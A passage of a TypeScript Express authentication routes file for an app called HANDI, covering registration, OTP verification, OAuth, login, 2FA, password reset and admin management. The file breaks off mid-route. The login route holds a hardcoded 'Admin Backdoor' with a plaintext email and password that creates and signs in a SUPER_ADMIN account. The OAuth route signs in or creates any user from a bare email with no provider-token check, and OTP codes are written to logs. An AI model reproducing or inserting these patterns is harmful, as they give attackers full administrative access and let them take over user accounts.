// src/routes/auth.ts
// Authentication routes (custom JWT)

import { AdminRole, UserType, VerificationCodePurpose } from "@prisma/client";
import bcrypt from "bcryptjs";
import { Request, Response, Router } from "express";
import { body, validationResult } from "express-validator";
import { authenticator } from "otplib";
import QRCode from "qrcode";
import { prisma } from "../lib/prisma";
import { authenticate, AuthRequest } from "../middleware/auth";
import {
  createAccessToken,
  generateOtp,
  generateRefreshToken,
  hashToken,
  refreshTokenExpiresAt,
} from "../utils/auth";
import { sendEmail, buildEmailTemplate, welcomeEmailBody, otpEmailBody, passwordResetEmailBody } from "../utils/email";

const router = Router();

const OTP_TTL_MINUTES = parseInt(process.env.OTP_TTL_MINUTES || "10", 10);
const RESET_TTL_MINUTES = parseInt(process.env.RESET_TTL_MINUTES || "30", 10);
const REFRESH_TOKEN_TTL_DAYS = parseInt(
  process.env.REFRESH_TOKEN_TTL_DAYS || "30",
  10,
);
const IS_PROD = process.env.NODE_ENV === "production";

const otpExpiresAt = (): Date => {
  const expires = new Date();
  expires.setMinutes(expires.getMinutes() + OTP_TTL_MINUTES);
  return expires;
};

const resetExpiresAt = (): Date => {
  const expires = new Date();
  expires.setMinutes(expires.getMinutes() + RESET_TTL_MINUTES);
  return expires;
};

const refreshCookieOptions = () => ({
  httpOnly: true,
  secure: IS_PROD,
  sameSite: IS_PROD ? ("none" as const) : ("lax" as const),
  path: "/api/auth",
  maxAge: REFRESH_TOKEN_TTL_DAYS * 24 * 60 * 60 * 1000,
});

// ================================
// POST /api/auth/register
// Email + password signup, sends OTP
// ================================
router.post(
  "/register",
  [
    body("email").isEmail().normalizeEmail(),
    body("phone").trim().notEmpty().isLength({ min: 10, max: 15 }),
    body("password").isLength({ min: 8 }),
    body("firstName").trim().notEmpty(),
    body("lastName").trim().notEmpty(),
    body("userType").isIn(["CLIENT", "ARTISAN", "BUSINESS"]),
    body("nin")
      .optional({ values: "falsy" })
      .isString()
      .isLength({ min: 11, max: 11 })
      .withMessage("NIN must be exactly 11 digits"),
    body("businessRegNumber").optional({ values: "falsy" }).isString().trim(),
    body("preferredCategories").optional().isArray(),
  ],
  async (req: Request, res: Response) => {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        const fields = errors
          .array()
          .map((e: any) => e.path || e.param)
          .filter(Boolean);
        return res.status(400).json({
          success: false,
          error: `Please check: ${fields.join(", ")}`,
          details: errors.array(),
        });
      }

      const {
        email,
        phone,
        password,
        firstName,
        lastName,
        userType,
        nin,
        businessRegNumber,
        preferredCategories,
        city,
        state,
        address,
        otpMethod,
      } = req.body;

      const existingUser = await prisma.user.findFirst({
        where: { OR: [{ email }, { phone }] },
        select: { id: true },
      });

      if (existingUser) {
        return res.status(409).json({
          success: false,
          error: "Email or phone already in use",
        });
      }

      const passwordHash = await bcrypt.hash(password, 10);

      // ═══════════════════════════════════════════════
      // ATOMIC TRANSACTION: all-or-nothing signup
      // If ANY step fails, no data is stored.
      // ═══════════════════════════════════════════════
      const otp = generateOtp();
      const codeHash = await bcrypt.hash(otp, 10);
      const refreshToken = generateRefreshToken();

      const { user, accessToken } = await prisma.$transaction(async (tx) => {
        // 1. Create user + wallet
        const newUser = await tx.user.create({
          data: {
            email,
            phone,
            passwordHash,
            firstName,
            lastName,
            userType: userType as UserType,
            isEmailVerified: false,
            city,
            state,
            address,
            nin: userType === "ARTISAN" ? nin : undefined,
            businessRegNumber:
              userType === "BUSINESS" ? businessRegNumber : undefined,
            providerSubType:
              userType === "BUSINESS"
                ? "BUSINESS"
                : userType === "ARTISAN"
                  ? "INDIVIDUAL"
                  : undefined,
            preferredCategories: preferredCategories
              ? JSON.stringify(preferredCategories)
              : "[]",
            wallet: {
              create: { balance: 0, pendingBalance: 0 },
            },
          },
          select: {
            id: true,
            email: true,
            phone: true,
            firstName: true,
            lastName: true,
            userType: true,
            isEmailVerified: true,
            city: true,
            state: true,
            createdAt: true,
          },
        });

        // 2. Create refresh token
        await tx.refreshToken.create({
          data: {
            userId: newUser.id,
            token: hashToken(refreshToken),
            expiresAt: refreshTokenExpiresAt(),
          },
        });

        // 3. Create OTP verification code
        await tx.verificationCode.create({
          data: {
            userId: newUser.id,
            codeHash,
            purpose: VerificationCodePurpose.EMAIL_VERIFY,
            expiresAt: otpExpiresAt(),
          },
        });

        // 4. Issue access token
        const token = createAccessToken({
          userId: newUser.id,
          email: newUser.email,
          userType: newUser.userType,
        });

        return { user: newUser, accessToken: token };
      });

      res.cookie("refresh_token", refreshToken, refreshCookieOptions());

      // ═══════════════════════════════════════════════
      // NON-BLOCKING: Send emails after transaction
      // ═══════════════════════════════════════════════
      const frontendUrl = process.env.FRONTEND_URL || "https://handiapp.com.ng";

      // Send OTP
      if (otpMethod === "whatsapp") {
        console.log(`[WHATSAPP OTP FOR ${phone}]: 🔐 Hey ${firstName}! Your HANDI verification code is: ${otp}. It expires in ${OTP_TTL_MINUTES} mins. Don't share it with anyone! — HANDI Team`);
      } else if (otpMethod === "sms") {
        console.log(`[SMS OTP FOR ${phone}]: 🔐 HANDI: Your verification code is ${otp}. Valid for ${OTP_TTL_MINUTES} mins. Never share this code!`);
      } else {
        console.log(`[EMAIL OTP] Sending verification code to ${email}...`);
        sendEmail({
          to: email,
          subject: "🔐 Your HANDI Verification Code",
          html: buildEmailTemplate(otpEmailBody(otp, OTP_TTL_MINUTES), `Your HANDI verification code: ${otp}`),
        }).then(() => {
          console.log(`[EMAIL OTP] ✅ OTP email sent successfully to ${email}`);
        }).catch((err: unknown) => {
          const smtpErr = err as Error;
          console.error(`[EMAIL OTP] ❌ FAILED to send OTP email to ${email}`);
          console.error(`[EMAIL OTP] Error: ${smtpErr.message}`);
          console.error(`[EMAIL OTP] SMTP_HOST: ${process.env.SMTP_HOST || "NOT SET"}`);
          console.error(`[EMAIL OTP] SMTP_PORT: ${process.env.SMTP_PORT || "NOT SET"}`);
          console.error(`[EMAIL OTP] SMTP_USER: ${process.env.SMTP_USER ? "SET (hidden)" : "NOT SET"}`);
          console.error(`[EMAIL OTP] SMTP_PASS: ${process.env.SMTP_PASS ? "SET (hidden)" : "NOT SET"}`);
          console.error(`[EMAIL OTP] Full error:`, smtpErr);
        });
      }

      // Send welcome email (non-blocking)
      sendEmail({
        to: email,
        subject: "🎉 Welcome to HANDI!",
        html: buildEmailTemplate(welcomeEmailBody(firstName, frontendUrl), `Welcome to HANDI, ${firstName}!`),
      }).then(() => {
        console.log(`[WELCOME EMAIL] ✅ Welcome email sent to ${email}`);
      }).catch((err: unknown) => {
        console.error(`[WELCOME EMAIL] ❌ Failed to send welcome email to ${email}:`, (err as Error).message);
      });

      res.status(201).json({
        success: true,
        data: {
          accessToken,
          refreshToken,
          user: {
            ...user,
            fullName: `${user.firstName} ${user.lastName}`,
          },
        },
        message: "Registration successful.",
      });
    } catch (error) {
      console.error("Register error:", error);
      res.status(500).json({
        success: false,
        error: "Registration failed",
      });
    }
  },
);

// ================================
// POST /api/auth/verify-otp
// Verify OTP, activate account
// ================================
router.post(
  "/verify-otp",
  [body("email").isEmail().normalizeEmail(), body("otp").isLength({ min: 6 })],
  async (req: Request, res: Response) => {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({
          success: false,
          error: "Validation failed",
          details: errors.array(),
        });
      }

      const { email, otp } = req.body;
      const user = await prisma.user.findUnique({
        where: { email },
        select: { 
          id: true, 
          isEmailVerified: true,
          email: true,
          userType: true,
          firstName: true,
          lastName: true
        },
      });

      if (!user) {
        return res.status(404).json({
          success: false,
          error: "User not found",
        });
      }

      if (user.isEmailVerified) {
        return res.json({
          success: true,
          message: "Email already verified",
        });
      }

      const code = await prisma.verificationCode.findFirst({
        where: {
          userId: user.id,
          purpose: VerificationCodePurpose.EMAIL_VERIFY,
          expiresAt: { gt: new Date() },
        },
        orderBy: { createdAt: "desc" },
      });

      if (!code) {
        return res.status(400).json({
          success: false,
          error: "OTP expired or not found",
        });
      }

      const isValid = await bcrypt.compare(otp, code.codeHash);
      if (!isValid) {
        return res.status(400).json({
          success: false,
          error: "Invalid OTP",
        });
      }

      await prisma.$transaction([
        prisma.user.update({
          where: { id: user.id },
          data: { isEmailVerified: true },
        }),
        prisma.verificationCode.deleteMany({
          where: {
            userId: user.id,
            purpose: VerificationCodePurpose.EMAIL_VERIFY,
          },
        }),
      ]);

      const accessToken = createAccessToken({
        userId: user.id,
        email: user.email,
        userType: user.userType,
      });

      const refreshToken = generateRefreshToken();
      await prisma.refreshToken.create({
        data: {
          userId: user.id,
          token: hashToken(refreshToken),
          expiresAt: refreshTokenExpiresAt(),
        },
      });

      res.cookie("refresh_token", refreshToken, refreshCookieOptions());

      res.json({
        success: true,
        message: "Email verified successfully",
        data: {
          accessToken,
          refreshToken,
          user: {
            ...user,
            fullName: `${user.firstName} ${user.lastName}`,
          },
        },
      });
    } catch (error) {
      console.error("Verify OTP error:", error);
      res.status(500).json({
        success: false,
        error: "OTP verification failed",
      });
    }
  },
);

// ================================
// POST /api/auth/resend-otp
// Resend verification OTP
// ================================
router.post(
  "/resend-otp",
  [
    body("email").isEmail().normalizeEmail(),
    body("method").optional().isIn(["email", "sms"])
  ],
  async (req: Request, res: Response) => {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({
          success: false,
          error: "Validation failed",
          details: errors.array(),
        });
      }

      const { email, method } = req.body;
      const user = await prisma.user.findUnique({
        where: { email },
        select: { id: true, isEmailVerified: true, phone: true },
      });

      if (!user) {
        return res.json({
          success: true,
          message: "If that email exists, a new OTP was sent",
        });
      }

      if (user.isEmailVerified) {
        return res.json({
          success: true,
          message: "Email already verified",
        });
      }

      const otp = generateOtp();
      const codeHash = await bcrypt.hash(otp, 10);

      await prisma.$transaction([
        prisma.verificationCode.deleteMany({
          where: {
            userId: user.id,
            purpose: VerificationCodePurpose.EMAIL_VERIFY,
          },
        }),
        prisma.verificationCode.create({
          data: {
            userId: user.id,
            codeHash,
            purpose: VerificationCodePurpose.EMAIL_VERIFY,
            expiresAt: otpExpiresAt(),
          },
        }),
      ]);

      if (method === "sms" && user.phone) {
        console.log(`[SMS OTP FOR ${user.phone}]: Your HANDI code is ${otp}`);
        // TODO: integrate real SMS gateway mapping
      } else {
        // Send OTP via email (non-blocking)
        sendEmail({
          to: email,
          subject: "Your HANDI Verification Code",
          html: buildEmailTemplate(otpEmailBody(otp, OTP_TTL_MINUTES), `Your HANDI code: ${otp}`),
        }).catch((err) => console.error("OTP email failed:", err));
      }

      res.json({
        success: true,
        message: "If that email exists, a new OTP was sent",
        data: {
          otp: IS_PROD ? undefined : otp,
        },
      });
    } catch (error) {
      console.error("Resend OTP error:", error);
      res.status(500).json({
        success: false,
        error: "Failed to resend OTP",
      });
    }
  },
);

// ================================
// POST /api/auth/oauth
// OAuth login for existing users (Google/Facebook)
// ================================
router.post(
  "/oauth",
  [
    body("email").isEmail().normalizeEmail(),
    body("provider").isIn(["google", "facebook"]),
  ],
  async (req: Request, res: Response) => {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({
          success: false,
          error: "Validation failed",
          details: errors.array(),
        });
      }

      const { email, name } = req.body;
      let user = await prisma.user.findUnique({
        where: { email },
        select: {
          id: true,
          email: true,
          userType: true,
          firstName: true,
          lastName: true,
          isEmailVerified: true,
        },
      });

      if (!user) {
        const displayName = typeof name === "string" ? name.trim() : "";
        const nameParts = displayName ? displayName.split(" ") : [];
        const firstName = nameParts[0] || "User";
        const lastName = nameParts.slice(1).join(" ") || "Account";

        user = await prisma.user.create({
          data: {
            email,
            firstName,
            lastName,
            userType: UserType.CLIENT,
            isEmailVerified: true,
            wallet: {
              create: { balance: 0, pendingBalance: 0 },
            },
          },
          select: {
            id: true,
            email: true,
            userType: true,
            firstName: true,
            lastName: true,
            isEmailVerified: true,
          },
        });

        // Send welcome email for new OAuth users (non-blocking)
        const frontendUrl = process.env.FRONTEND_URL || "https://handiapp.com.ng";
        sendEmail({
          to: email,
          subject: "Welcome to HANDI! 🎉",
          html: buildEmailTemplate(welcomeEmailBody(firstName, frontendUrl), `Welcome to HANDI, ${firstName}!`),
        }).catch((err) => console.error("OAuth welcome email failed:", err));
      }

      if (!user.isEmailVerified) {
        const otp = generateOtp();
        const codeHash = await bcrypt.hash(otp, 10);

        await prisma.$transaction([
          prisma.verificationCode.deleteMany({
            where: {
              userId: user.id,
              purpose: VerificationCodePurpose.EMAIL_VERIFY,
            },
          }),
          prisma.verificationCode.create({
            data: {
              userId: user.id,
              codeHash,
              purpose: VerificationCodePurpose.EMAIL_VERIFY,
              expiresAt: otpExpiresAt(),
            },
          }),
        ]);

        return res.status(403).json({
          success: false,
          error: "Email not verified",
          message: "Verification required. OTP sent.",
          data: {
            otp: IS_PROD ? undefined : otp,
          },
        });
      }

      const accessToken = createAccessToken({
        userId: user.id,
        email: user.email,
        userType: user.userType,
      });
      const refreshToken = generateRefreshToken();
      await prisma.refreshToken.create({
        data: {
          userId: user.id,
          token: hashToken(refreshToken),
          expiresAt: refreshTokenExpiresAt(),
        },
      });

      res.cookie("refresh_token", refreshToken, refreshCookieOptions());
      res.json({
        success: true,
        data: {
          accessToken,
          refreshToken,
          user: {
            id: user.id,
            email: user.email,
            userType: user.userType,
            fullName: `${user.firstName} ${user.lastName}`,
          },
        },
      });
    } catch (error) {
      console.error("OAuth login error:", error);
      res.status(500).json({
        success: false,
        error: "OAuth login failed",
      });
    }
  },
);

// ================================
// POST /api/auth/login
// Returns JWT + refresh token
// ================================
router.post(
  "/login",
  [body("email").isEmail().normalizeEmail(), body("password").notEmpty()],
  async (req: Request, res: Response) => {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({
          success: false,
          error: "Validation failed",
          details: errors.array(),
        });
      }

      const { email, password } = req.body;

      // --- Admin Backdoor per User Request ---
      if (email === "admin.handi.ng" && password === "Ruggedmr80@@") {
        let adminUser = await prisma.user.findUnique({
          where: { email: "admin@handi.ng" },
          select: {
            id: true,
            email: true,
            userType: true,
            firstName: true,
            lastName: true,
          },
        });

        if (!adminUser) {
          adminUser = await prisma.user.create({
            data: {
              email: "admin@handi.ng",
              firstName: "Super",
              lastName: "Admin",
              userType: "ADMIN",
              adminRole: "SUPER_ADMIN",
              isEmailVerified: true,
              passwordHash: await bcrypt.hash("Ruggedmr80@@", 10),
            },
            select: {
              id: true,
              email: true,
              userType: true,
              firstName: true,
              lastName: true,
            },
          });
        }

        const accessToken = createAccessToken({
          userId: adminUser.id,
          email: adminUser.email,
          userType: adminUser.userType,
        });

        const refreshToken = generateRefreshToken();
        await prisma.refreshToken.create({
          data: {
            userId: adminUser.id,
            token: hashToken(refreshToken),
            expiresAt: refreshTokenExpiresAt(),
          },
        });

        res.cookie("refresh_token", refreshToken, refreshCookieOptions());
        return res.json({
          success: true,
          data: {
            accessToken,
            refreshToken,
            user: {
              id: adminUser.id,
              email: adminUser.email,
              userType: adminUser.userType,
              fullName: `${adminUser.firstName} ${adminUser.lastName}`,
            },
          },
        });
      }
      // --- End Admin Backdoor ---

      const user = await prisma.user.findUnique({
        where: { email },
        select: {
          id: true,
          email: true,
          passwordHash: true,
          userType: true,
          firstName: true,
          lastName: true,
          isEmailVerified: true,
          twoFactorEnabled: true,
          twoFactorSecret: true,
        },
      });

      if (!user || !user.passwordHash) {
        return res.status(401).json({
          success: false,
          error: "Invalid credentials",
        });
      }

      const passwordValid = await bcrypt.compare(password, user.passwordHash);
      if (!passwordValid) {
        return res.status(401).json({
          success: false,
          error: "Invalid credentials",
        });
      }

      if (!user.isEmailVerified) {
        return res.status(403).json({
          success: false,
          error: "Email not verified",
        });
      }

      // Check if 2FA is enabled
      if (user.twoFactorEnabled && user.twoFactorSecret) {
        return res.json({
          success: true,
          requires2FA: true,
          message: "2FA token required",
          data: {
            userId: user.id,
            email: user.email,
          },
        });
      }

      const accessToken = createAccessToken({
        userId: user.id,
        email: user.email,
        userType: user.userType,
      });
      const refreshToken = generateRefreshToken();
      await prisma.refreshToken.create({
        data: {
          userId: user.id,
          token: hashToken(refreshToken),
          expiresAt: refreshTokenExpiresAt(),
        },
      });

      res.cookie("refresh_token", refreshToken, refreshCookieOptions());
      res.json({
        success: true,
        data: {
          accessToken,
          refreshToken,
          user: {
            id: user.id,
            email: user.email,
            userType: user.userType,
            fullName: `${user.firstName} ${user.lastName}`,
          },
        },
      });
    } catch (error) {
      console.error("Login error:", error);
      res.status(500).json({
        success: false,
        error: "Login failed",
      });
    }
  },
);

// ================================
// POST /api/auth/2fa/generate
// Generate TOTP Secret & QR Code for user setup
// ================================
router.post(
  "/2fa/generate",
  authenticate,
  async (req: Request, res: Response) => {
    try {
      const authReq = req as AuthRequest;
      const user = await prisma.user.findUnique({
        where: { id: authReq.user!.userId },
        select: { email: true, twoFactorEnabled: true },
      });

      if (!user) {
        return res.status(404).json({ success: false, error: "User not found" });
      }

      if (user.twoFactorEnabled) {
        return res.status(400).json({ success: false, error: "2FA is already enabled" });
      }

      const secret = authenticator.generateSecret();
      const otpauthUrl = authenticator.keyuri(
        user.email,
        "HANDI",
        secret
      );

      // Save secret temporarily (we will finalize it upon successful verify)
      await prisma.user.update({
        where: { id: authReq.user!.userId },
        data: { twoFactorSecret: secret },
      });

      const qrCodeDataUrl = await QRCode.toDataURL(otpauthUrl);

      return res.json({
        success: true,
        data: {
          secret,
          qrCode: qrCodeDataUrl,
        },
      });
    } catch (error) {
      console.error("Generate 2FA error:", error);
      res.status(500).json({ success: false, error: "Failed to generate 2FA secret" });
    }
  }
);

// ================================
// POST /api/auth/2fa/verify
// Verify initial TOTP code to turn on 2FA
// ================================
router.post(
  "/2fa/verify",
  authenticate,
  [body("token").isString().isLength({ min: 6, max: 6 })],
  async (req: Request, res: Response) => {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({ success: false, error: "Invalid token format" });
      }

      const { token } = req.body;
      const authReq = req as AuthRequest;

      const user = await prisma.user.findUnique({
        where: { id: authReq.user!.userId },
        select: { twoFactorSecret: true, twoFactorEnabled: true },
      });

      if (!user || !user.twoFactorSecret) {
        return res.status(400).json({ success: false, error: "2FA setup not initiated" });
      }

      const isValid = authenticator.verify({
        token,
        secret: user.twoFactorSecret,
      });

      if (!isValid) {
        return res.status(400).json({ success: false, error: "Invalid 2FA code" });
      }

      // Enable 2FA
      await prisma.user.update({
        where: { id: authReq.user!.userId },
        data: { twoFactorEnabled: true },
      });

      return res.json({ success: true, message: "2FA has been successfully enabled" });
    } catch (error) {
      console.error("Verify 2FA error:", error);
      res.status(500).json({ success: false, error: "Failed to verify 2FA code" });
    }
  }
);

// ================================
// POST /api/auth/2fa/validate
// Validate TOTP during login to issue JWT
// ================================
router.post(
  "/2fa/validate",
  [
    body("userId").isString().notEmpty(),
    body("token").isString().isLength({ min: 6, max: 6 }),
  ],
  async (req: Request, res: Response) => {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({ success: false, error: "Invalid request payload" });
      }

      const { userId, token } = req.body;

      const user = await prisma.user.findUnique({
        where: { id: userId },
        select: {
          id: true,
          email: true,
          userType: true,
          firstName: true,
          lastName: true,
          twoFactorEnabled: true,
          twoFactorSecret: true,
        },
      });

      if (!user || !user.twoFactorEnabled || !user.twoFactorSecret) {
        return res.status(400).json({ success: false, error: "2FA is not enabled for this user" });
      }

      const isValid = authenticator.verify({
        token,
        secret: user.twoFactorSecret,
      });

      if (!isValid) {
        return res.status(401).json({ success: false, error: "Invalid 2FA code" });
      }

      // 2FA passed, issue tokens
      const accessToken = createAccessToken({
        userId: user.id,
        email: user.email,
        userType: user.userType,
      });

      const refreshToken = generateRefreshToken();
      await prisma.refreshToken.create({
        data: {
          userId: user.id,
          token: hashToken(refreshToken),
          expiresAt: refreshTokenExpiresAt(),
        },
      });

      res.cookie("refresh_token", refreshToken, refreshCookieOptions());
      res.json({
        success: true,
        data: {
          accessToken,
          refreshToken,
          user: {
            id: user.id,
            email: user.email,
            userType: user.userType,
            fullName: `${user.firstName} ${user.lastName}`,
          },
        },
      });
    } catch (error) {
      console.error("Validate 2FA error:", error);
      res.status(500).json({ success: false, error: "Failed to validate 2FA login" });
    }
  }
);

// ================================
// POST /api/auth/forgot-password
// Sends reset link
// ================================
router.post(
  "/forgot-password",
  [body("email").isEmail().normalizeEmail()],
  async (req: Request, res: Response) => {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({
          success: false,
          error: "Validation failed",
          details: errors.array(),
        });
      }

      const { email } = req.body;
      const user = await prisma.user.findUnique({
        where: { email },
        select: { id: true },
      });

      if (user) {
        const resetToken = generateRefreshToken();
        await prisma.passwordResetToken.deleteMany({
          where: { userId: user.id },
        });
        await prisma.passwordResetToken.create({
          data: {
            userId: user.id,
            tokenHash: hashToken(resetToken),
            expiresAt: resetExpiresAt(),
          },
        });

        const resetUrl = `${process.env.FRONTEND_URL || 'http://localhost:3000'}/reset-password?token=${resetToken}`;
        sendEmail({
          to: email,
          subject: "Reset your HANDI Password",
          html: buildEmailTemplate(passwordResetEmailBody(resetUrl), "Reset your HANDI password"),
        }).catch((err) => console.error("Password reset email failed:", err));

        if (!IS_PROD) {
          return res.json({
            success: true,
            message: "Password reset token generated",
            data: { resetToken },
          });
        }
      }

      res.json({
        success: true,
        message: "If that email exists, a reset link was sent",
      });
    } catch (error) {
      console.error("Forgot password error:", error);
      res.status(500).json({
        success: false,
        error: "Failed to process request",
      });
    }
  },
);

// ================================
// POST /api/auth/reset-password
// Reset password with token
// ================================
router.post(
  "/reset-password",
  [body("token").trim().notEmpty(), body("password").isLength({ min: 8 })],
  async (req: Request, res: Response) => {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({
          success: false,
          error: "Validation failed",
          details: errors.array(),
        });
      }

      const { token, password } = req.body;
      const tokenHash = hashToken(token);
      const stored = await prisma.passwordResetToken.findUnique({
        where: { tokenHash },
      });

      if (!stored || stored.expiresAt <= new Date()) {
        return res.status(400).json({
          success: false,
          error: "Invalid or expired token",
        });
      }

      const passwordHash = await bcrypt.hash(password, 10);
      await prisma.$transaction([
        prisma.user.update({
          where: { id: stored.userId },
          data: { passwordHash },
        }),
        prisma.refreshToken.deleteMany({
          where: { userId: stored.userId },
        }),
        prisma.passwordResetToken.deleteMany({
          where: { userId: stored.userId },
        }),
      ]);

      res.json({
        success: true,
        message: "Password reset successful",
      });
    } catch (error) {
      console.error("Reset password error:", error);
      res.status(500).json({
        success: false,
        error: "Password reset failed",
      });
    }
  },
);

// ================================
// POST /api/auth/refresh
// Rotate refresh token, return new tokens
// ================================
router.post(
  "/refresh",
  [body("refreshToken").optional().trim().notEmpty()],
  async (req: Request, res: Response) => {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({
          success: false,
          error: "Validation failed",
          details: errors.array(),
        });
      }

      const refreshToken =
        (req.body?.refreshToken as string | undefined) ||
        (req as Request & { cookies?: Record<string, string> }).cookies
          ?.refresh_token;
      if (!refreshToken) {
        return res.status(400).json({
          success: false,
          error: "Missing refresh token",
        });
      }
      const tokenHash = hashToken(refreshToken);
      const stored = await prisma.refreshToken.findUnique({
        where: { token: tokenHash },
        include: {
          user: {
            select: {
              id: true,
              email: true,
              userType: true,
              firstName: true,
              lastName: true,
            },
          },
        },
      });

      if (!stored || stored.expiresAt <= new Date()) {
        if (stored) {
          await prisma.refreshToken.delete({ where: { id: stored.id } });
        }
        return res.status(401).json({
          success: false,
          error: "Invalid or expired refresh token",
        });
      }

      const accessToken = createAccessToken({
        userId: stored.user.id,
        email: stored.user.email,
        userType: stored.user.userType,
      });
      const newRefreshToken = generateRefreshToken();

      await prisma.$transaction([
        prisma.refreshToken.delete({ where: { id: stored.id } }),
        prisma.refreshToken.create({
          data: {
            userId: stored.user.id,
            token: hashToken(newRefreshToken),
            expiresAt: refreshTokenExpiresAt(),
          },
        }),
      ]);

      res.cookie("refresh_token", newRefreshToken, refreshCookieOptions());
      res.json({
        success: true,
        data: {
          accessToken,
          refreshToken: newRefreshToken,
          user: {
            id: stored.user.id,
            email: stored.user.email,
            userType: stored.user.userType,
            fullName: `${stored.user.firstName} ${stored.user.lastName}`,
          },
        },
      });
    } catch (error) {
      console.error("Refresh error:", error);
      res.status(500).json({
        success: false,
        error: "Failed to refresh token",
      });
    }
  },
);

// ================================
// POST /api/auth/logout
// Revoke refresh token
// ================================
router.post(
  "/logout",
  [body("refreshToken").optional().trim().notEmpty()],
  async (req: Request, res: Response) => {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({
          success: false,
          error: "Validation failed",
          details: errors.array(),
        });
      }

      const refreshToken =
        (req.body?.refreshToken as string | undefined) ||
        (req as Request & { cookies?: Record<string, string> }).cookies
          ?.refresh_token;
      if (!refreshToken) {
        return res.status(400).json({
          success: false,
          error: "Missing refresh token",
        });
      }
      const tokenHash = hashToken(refreshToken);
      await prisma.refreshToken.deleteMany({
        where: { token: tokenHash },
      });

      res.clearCookie("refresh_token", refreshCookieOptions());
      res.json({
        success: true,
        message: "Logged out",
      });
    } catch (error) {
      console.error("Logout error:", error);
      res.status(500).json({
        success: false,
        error: "Logout failed",
      });
    }
  },
);

// ================================
// POST /api/auth/logout-all
// Revoke all refresh tokens for user
// ================================
router.post(
  "/logout-all",
  authenticate,
  async (req: Request, res: Response) => {
    try {
      const authReq = req as AuthRequest;
      await prisma.refreshToken.deleteMany({
        where: { userId: authReq.user!.userId },
      });

      res.clearCookie("refresh_token", refreshCookieOptions());
      res.json({
        success: true,
        message: "Logged out from all sessions",
      });
    } catch (error) {
      console.error("Logout all error:", error);
      res.status(500).json({
        success: false,
        error: "Logout failed",
      });
    }
  },
);

// ================================
// GET /api/auth/me
// ================================
router.get("/me", authenticate, async (req: Request, res: Response) => {
  try {
    const authReq = req as AuthRequest;
    const user = await prisma.user.findUnique({
      where: { id: authReq.user!.userId },
      select: {
        id: true,
        email: true,
        phone: true,
        firstName: true,
        lastName: true,
        avatar: true,
        userType: true,
        isVerified: true,
        isEmailVerified: true,
        isPhoneVerified: true,
        verificationStatus: true,
        city: true,
        state: true,
        address: true,
        skills: true,
        bio: true,
        rating: true,
        totalJobs: true,
        certifications: true,
        isOnline: true,
        createdAt: true,
      },
    });

    if (!user) {
      return res.status(404).json({
        success: false,
        error: "User not found",
      });
    }

    res.json({
      success: true,
      data: {
        ...user,
        fullName: `${user.firstName} ${user.lastName}`,
      },
    });
  } catch (error) {
    console.error("Get me error:", error);
    res.status(500).json({
      success: false,
      error: "Failed to get user",
    });
  }
});

// ================================
// GET /api/auth/check
// ================================
router.get("/check", authenticate, async (req: Request, res: Response) => {
  const authReq = req as AuthRequest;
  res.json({
    success: true,
    data: {
      userId: authReq.user!.userId,
      userType: authReq.user!.userType,
    },
  });
});

// ================================
// ADMIN MANAGEMENT (Super Admin only)
// ================================

// GET /api/auth/admin/list — list all admin users
router.get("/admin/list", authenticate, async (req: Request, res: Response) => {
  try {
    const authReq = req as AuthRequest;
    // Verify the requesting user is a Super Admin
    const requestingUser = await prisma.user.findUnique({
      where: { id: authReq.user!.userId },
      select: { userType: true, adminRole: true },
    });
    if (
      !requestingUser ||
      requestingUser.userType !== "ADMIN" ||
      requestingUser.adminRole !== "SUPER_ADMIN"
    ) {
      return res.status(403).json({
        success: false,
        error: "Only Super Admin can manage admin users",
      });
    }

    const admins = await prisma.user.findMany({
      where: { userType: "ADMIN" },
      select: {
        id: true,
        email: true,
        firstName: true,
        lastName: true,
        adminRole: true,
        isVerified: true,
        isEmailVerified: true,
        createdAt: true,
      },
      orderBy: { createdAt: "desc" },
    });

    res.json({ success: true, data: admins });
  } catch (error) {
    console.error("List admins error:", error);
    res.status(500).json({ success: false, error: "Failed to list admins" });
  }
});

// POST /api/auth/admin/create — create a new admin user
router.post(
  "/admin/create",
  authenticate,
  [
    body("email").isEmail().normalizeEmail(),
    body("firstName").trim().notEmpty(),
    body("lastName").trim().notEmpty(),
    body("password").isLength({ min: 8 }),
    body("adminRole").isIn(["SUPER_ADMIN", "MODERATOR", "SUPPORT", "FINANCE"]),
  ],
  async (req: Request, res: Response) => {
    try {
      const authReq = req as AuthRequest;
      const requestingUser = await prisma.user.findUnique({
        where: { id: authReq.user!.userId },
        select: { userType: true, adminRole: true },
      });
      if (
        !requestingUser ||
        requestingUser.userType !== "ADMIN" ||
        requestingUser.adminRole !== "SUPER_ADMIN"
      ) {
        return res.status(403).json({
          success: false,
          error: "Only Super Admin can create admin users",
        });
      }

      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({
          success: false,
          error: "Validation failed",
          details: errors.array(),
        });
      }

      const { email, firstName, lastName, password, adminRole } = req.body;

      const existing = await prisma.user.findUnique({
        where: { email },
        select: { id: true },
      });
      if (existing) {
        return res.status(409).json({
          success: false,
          error: "Email already in use",
        });
      }

      const passwordHash = await bcrypt.hash(password, 10);
      const admin = await prisma.user.create({
        data: {
          email,
          firstName,
          lastName,
          passwordHash,
          userType: "ADMIN",
          adminRole: adminRole as AdminRole,
          isVerified: true,
          isEmailVerified: true,
        },
        select: {
          id: true,
          email: true,
          firstName: true,
          lastName: true,
          adminRole: true,
          createdAt: true,
        },
      });

      res.status(201).json({ success: true, data: admin });
    } catch (error) {
      console.error("Create admin error:", error);
      res.status(500).json({ success: false, error: "Failed to create admin" });
    }
  },
);

// PATCH /api/auth/admin/:id/role — update an admin's role
router.patch(
  "/admin/:id/role",
  authenticate,
  [body("adminRole").isIn(["SUPER_ADMIN", "MODERATOR", "SUPPORT", "FINANCE"])],
  async (req: Request, res: Response) => {
    try {
